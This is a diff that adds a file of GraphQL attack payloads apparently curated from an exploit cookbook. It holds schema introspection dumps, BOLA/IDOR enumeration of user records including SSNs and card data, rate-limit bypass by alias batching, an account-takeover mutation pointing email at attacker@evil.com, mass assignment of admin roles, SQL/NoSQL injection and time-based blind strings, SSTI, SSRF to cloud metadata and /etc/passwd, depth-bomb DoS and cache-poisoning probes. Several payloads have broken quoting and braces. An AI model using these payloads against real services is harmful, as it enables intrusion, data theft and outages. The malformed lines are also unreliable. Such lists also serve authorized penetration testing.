@@ -1,0 +1,91 @@
+# GraphQL Attack Payloads - Curated from exploit-cookbook
+# Source: graphql-attacks.md + graphql-audit-7phase.md
+
+# Introspection query
+{__schema{queryType{name,fields{name,description,args{name,type{name,kind,ofType{name,kind}}}}}}}
+
+# Full introspection dump
+{__schema{types{name,kind,fields{name,type{name,kind,ofType{name,kind}},args{name,type{name}}}}}}
+
+# Mutation introspection
+{__schema{mutationType{name,fields{name,description,args{name,type{name,kind,ofType{name,kind}}}}}}}
+
+# BOLA via GraphQL
+query{user(id:"1"){id,name,email,role}}
+query{user(id:"2"){id,name,email,role}}
+query{users{edges{node{id,name,email,role}}}}
+
+# Alias batching (rate limit bypass)
+query{a1:user(id:"1"){email}a2:user(id:"2"){email}a3:user(id:"3"){email}}
+
+# Mutation abuse - change email (ATO)
+mutation{updateUser(input:{id:"1",email:"attacker@evil.com"}){id,email}}
+
+# Introspection bypass (when disabled)
+query{__type(name:"User"){fields{name,type{name}}}}
+
+# Error-based extraction
+query{user(id:"1 OR 1=1"){id,name}}
+query{user(id:"' OR 1=1--"){id,name}}
+
+# Subscription hijacking
+subscription{onUserUpdate{id,name,email}}
+
+# Batch DoS
+[{query:"{users{edges{node{id,name,email,phone,address}}}}"},
+ {query:"{users{edges{node{id,name,email,phone,address}}}}"},
+ {query:"{users{edges{node{id,name,email,phone,address}}}}"}]
+
+# Nested depth bombs (DoS / depth limit probing)
+query{user{id{name{id{name{id{name{id{name{id{name{id{name{name{id{name{id}}}}}}}}}}}}}}}
+query{a{b{c{d{e{f{g{h{i{j{k{l{m{id}}}}}}}}}}}}}}
+
+# Introspection of all field types (data mapping)
+{__type(name:"Query"){fields{name type{name kind ofType{name kind}}}}}
+{__type(name:"Mutation"){fields{name type{name kind}}}}
+{__type(name:"User"){fields{name type{name kind}}}}
+{__schema{queryType{fields{name}}}}
+{__schema{mutationType{fields{name}}}}
+
+# Field-level BOLA / IDOR
+query{orders(first:100){edges{node{id,user{id,email}}}}{id}}
+query{user(id:"999"){id name email phone address ssn}}
+query{user(id:"1"){id friends{id friends{id name}}}}
+query{order(id:"42"){id total items{sku qty price} user{id email card{last4}}}}
+
+# Nested BOLA traversal
+query{org(id:"1"){id users{id email role org{id users{id email}}}}}
+
+# Mutation injection (hidden field / mass assignment)
+mutation{register(input:{email:"a@e.com",password:"x",role:"admin"}){id role}}
+mutation{updateProfile(input:{id:"2",bio:"x",admin:true}){id admin}}
+mutation{createOrder(input:{id:"3",qty:1,price:1,discount:100}){id total}}
+
+# SQLi / NoSQLi via string args
+query{user(id:"1\"}{id}
+query{user(id:"1') OR ('1'='1\"){id name email}
+query{user(id:\"{\\\"$ne\\\":\\\"\\\"}\"){id}
+query{search(q:\"' UNION SELECT username,password,3,4 FROM users--\"){id}
+query{user(id:\"1; waitfor delay '0:0:5'--\"){id}
+
+# SSTI via GraphQL args
+query{user(id:\"{{7*7}}\"){id}
+query{render(template:\"${7*7}\"){out}
+
+# HTTP verb / method smuggling via GraphQL
+query{redirect(to:\"http://169.254.169.254/latest/meta-data/\"){url}}
+query{fetch(url:\"file:///etc/passwd\"){content}
+
+# Time-based blind oracle
+query{user(id:\"1' AND SLEEP(5)--\"){id}
+query{user(id:\"1\" AND WAITFOR DELAY '0:0:5'--\"){id}
+
+# Pagination exfil (all users)
+query{users(first:100,after:\"0\"){edges{node{id name email}}pageInfo{endCursor hasNextPage}}}
+query{users(first:100,after:\"0\"){pageInfo{endCursor}}}{users(first:100,after:\"CURSOR\"){edges{node{id email}}}}
+query{orders(first:1000){edges{node{id created user{id email} total}}}}
+
+# Caching / poisoning probes
+query{user(id:\"1\" /* cache-bust */){id name}
+query{user(id:\"1#user\"){id}
+query{user(id:\"%0aUser\"){id}
